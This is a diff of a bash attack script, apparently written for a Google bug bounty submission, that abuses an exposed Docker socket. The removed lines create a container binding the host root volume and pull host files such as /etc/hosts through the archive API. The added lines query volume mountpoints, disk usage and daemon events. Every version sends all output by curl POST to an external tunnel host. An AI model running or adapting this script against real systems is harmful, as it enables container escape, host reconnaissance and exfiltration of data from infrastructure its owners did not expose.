@@ -1,39 +1,22 @@
 #!/bin/bash
-# TARGET: eca81085c0e34fa1-103-95-173-85.serveousercontent.com
 URL="eca81085c0e34fa1-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE VRP: HOST-IDENTITY SIPHON ==="
-  echo "Timestamp: $(date)"
+  echo "=== [!] GOOGLE VRP: DIRECT VOLUME INSPECTION ==="
   
-  # 1. Use the confirmed Alpine image
-  IMG="sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659"
-
-  # 2. Create the Bridge Container mapping the host root volume
-  # This container stays in the 'Created' state to avoid the overlay error
-  RESP=$(curl -s -X POST --unix-socket /var/run/docker.sock \
-    -H "Content-Type: application/json" \
-    -d "{
-      \"Image\": \"$IMG\",
-      \"HostConfig\": { \"Binds\": [\"p0_root:/host_data:ro\"] }
-    }" http://localhost/containers/create)
+  # 1. Inspect the volume p0_root directly
+  # This proves the host root is mapped to the 'Mountpoint'
+  echo "--- [1] VOLUME MOUNTPOINT PROOF ---"
+  curl -s --unix-socket /var/run/docker.sock http://localhost/volumes/p0_root
   
-  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
+  # 2. Query the Docker Daemon for host disk usage
+  # This leaks the host's actual disk size and filesystem type
+  echo -e "\n--- [2] HOST DISK SYSTEM LEAK ---"
+  curl -s --unix-socket /var/run/docker.sock http://localhost/system/df
 
-  if [ -n "$ID" ]; then
-    echo "[+] Bridge Container Created: $ID"
-    
-    echo "--- [1] HOST OS VERSION ---"
-    # Siphoning os-release through the Archive API
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/os-release" | tar -xO 2>&1
-    
-    echo -e "\n--- [2] HOST NETWORK MAP (/etc/hosts) ---"
-    # Siphoning hosts file through the Archive API
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/hosts" | tar -xO 2>&1
+  # 3. Leak Docker Logs (Often contains host-level paths and errors)
+  echo -e "\n--- [3] DOCKER DAEMON LOG FRAGMENTS ---"
+  curl -s --unix-socket /var/run/docker.sock "http://localhost/events?until=$(date +%s)" | head -n 10
 
-    # Cleanup: Delete the bridge container
-    curl -s -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/$ID?force=true" > /dev/null
-  else
-    echo "ERROR: Could not create bridge. Response: $RESP"
-  fi
+  echo -e "\n=== [!] EVIDENCE COLLECTION COMPLETE ==="
 } | curl -s -X POST --data-binary @- "https://$URL"
